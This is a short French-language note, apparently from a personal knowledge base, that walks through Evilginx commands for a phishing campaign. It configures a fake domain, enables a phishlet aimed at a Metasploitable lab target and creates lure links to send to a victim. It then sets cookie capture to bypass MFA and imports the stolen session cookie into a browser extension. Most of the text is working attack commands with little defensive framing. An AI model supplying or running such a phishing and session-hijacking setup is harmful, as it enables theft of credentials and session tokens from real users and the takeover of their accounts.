Une fois notre [[Creating Phishlet]] configurer.

#Basic

Configurer un faux domaine cible

```c
config domain fake.com
```

Attributer une IP au faux domain, cette IP est generalement celui ou `evil` est heberger

```c
config ipv4 127.0.0.1
```

Donner un hostname a un phishlets le nom d'un phishlets doit toujours se terminer par le **domaine** configurer dans `evil` 

Le mieux est d'utiliser le `proxy_hosts->domain.config.domain`

```c
phishlets hostname metasploitable metasploitable.fake.com
```

Activer le phislets cela demande une configuration TLS

```c
phishlets enable metasploitable
phishlets metasploitable
```

Generer un host `/etc/hosts`

```c
phishlets get-hosts metasploitable
```

Cree un leurs, c'est le lien qui sera envoyer a la victime

```c
lures create metasploitable
lures get-url 0
```

Afficher les informations d'une sessions

```c
sessions
sessions id
```

#MFA 

Ajouter `always`dans ce fichier pour que Evilginx prend toutes les donnes

```json
auth_tokens:
    keys: ['PHPSESSID:always', 'security:always']
```

Copuer le result du cookie dans EditThisCookie

[Personalizing Lures](./Personalizing%20Lures.md)

